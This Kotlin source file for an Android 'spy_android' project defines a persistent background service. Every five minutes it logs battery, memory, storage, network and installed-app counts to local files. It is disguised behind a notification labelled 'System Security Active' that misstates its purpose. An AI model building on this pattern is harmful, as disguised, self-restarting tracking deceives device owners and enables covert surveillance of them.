package com.example.spy_android.services

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import android.util.Log
import kotlinx.coroutines.*
import java.io.File

class BackgroundTrackingService : Service() {

    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val CHANNEL_ID = "TRACKING_SERVICE_CHANNEL"
    private val NOTIFICATION_ID = 1001

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        Log.d("BackgroundService", "백그라운드 추적 서비스 생성됨")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        startBackgroundTracking()

        Log.d("BackgroundService", "백그라운드 추적 시작")

        // 서비스가 종료되어도 자동 재시작
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.cancel()
        Log.d("BackgroundService", "백그라운드 추적 서비스 종료됨")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Security Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "System monitoring and security service"
                setShowBadge(false)
            }

            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun startForegroundService() {
        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security Active")
            .setContentText("Monitoring device for security threats...")
            .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setShowWhen(false)
            .build()

        startForeground(NOTIFICATION_ID, notification)
    }

    private fun startBackgroundTracking() {
        serviceScope.launch {
            while (isActive) {
                try {
                    // 주기적인 데이터 수집 작업
                    performDataCollection()

                    // 5분마다 실행
                    delay(5 * 60 * 1000)

                } catch (e: Exception) {
                    Log.e("BackgroundService", "데이터 수집 오류: ${e.message}")
                    delay(60 * 1000) // 오류 발생 시 1분 후 재시도
                }
            }
        }
    }

    private suspend fun performDataCollection() {
        withContext(Dispatchers.IO) {
            try {
                // 시스템 상태 정보 수집
                val systemStatus = collectSystemStatus()
                logData("system_status", systemStatus)

                // 네트워크 상태 수집
                val networkStatus = collectNetworkStatus()
                logData("network_status", networkStatus)

                // 앱 사용 정보 수집 (가능한 경우)
                val appUsage = collectAppUsageInfo()
                logData("app_usage", appUsage)

                Log.d("BackgroundService", "백그라운드 데이터 수집 완료")

            } catch (e: Exception) {
                Log.e("BackgroundService", "데이터 수집 실패: ${e.message}")
            }
        }
    }

    private fun collectSystemStatus(): Map<String, Any> {
        return mapOf(
            "timestamp" to System.currentTimeMillis(),
            "battery_level" to getBatteryLevel(),
            "memory_usage" to getMemoryUsage(),
            "storage_info" to getStorageInfo()
        )
    }

    private fun collectNetworkStatus(): Map<String, Any> {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo

        return mapOf(
            "timestamp" to System.currentTimeMillis(),
            "is_connected" to (networkInfo?.isConnected == true),
            "network_type" to (networkInfo?.typeName ?: "Unknown"),
            "is_roaming" to (networkInfo?.isRoaming == true)
        )
    }

    private fun collectAppUsageInfo(): Map<String, Any> {
        // 앱 사용 통계는 특별한 권한이 필요하므로 기본 정보만 수집
        val packageManager = packageManager
        val installedApps = packageManager.getInstalledApplications(0)

        return mapOf(
            "timestamp" to System.currentTimeMillis(),
            "total_installed_apps" to installedApps.size,
            "system_apps" to installedApps.count { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 },
            "user_apps" to installedApps.count { (it.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) == 0 }
        )
    }

    private fun getBatteryLevel(): Int {
        val batteryIntent = registerReceiver(null, android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
        val level = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryIntent?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1) ?: -1

        return if (level == -1 || scale == -1) -1 else (level * 100 / scale)
    }

    private fun getMemoryUsage(): Map<String, Long> {
        val activityManager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val memoryInfo = ActivityManager.MemoryInfo()
        activityManager.getMemoryInfo(memoryInfo)

        return mapOf(
            "total_memory" to memoryInfo.totalMem,
            "available_memory" to memoryInfo.availMem,
            "low_memory" to if (memoryInfo.lowMemory) 1L else 0L
        )
    }

    private fun getStorageInfo(): Map<String, Long> {
        val dataDir = filesDir
        return mapOf(
            "total_space" to dataDir.totalSpace,
            "free_space" to dataDir.freeSpace,
            "usable_space" to dataDir.usableSpace
        )
    }

    private fun logData(type: String, data: Map<String, Any>) {
        try {
            val logDir = File(filesDir, "logs")
            if (!logDir.exists()) {
                logDir.mkdirs()
            }

            val logFile = File(logDir, "${type}_background.log")
            val jsonData = android.text.TextUtils.join(",", data.map { "\"${it.key}\":\"${it.value}\"" })
            logFile.appendText("{$jsonData}\n")

        } catch (e: Exception) {
            Log.e("BackgroundService", "로그 저장 실패: ${e.message}")
        }
    }
}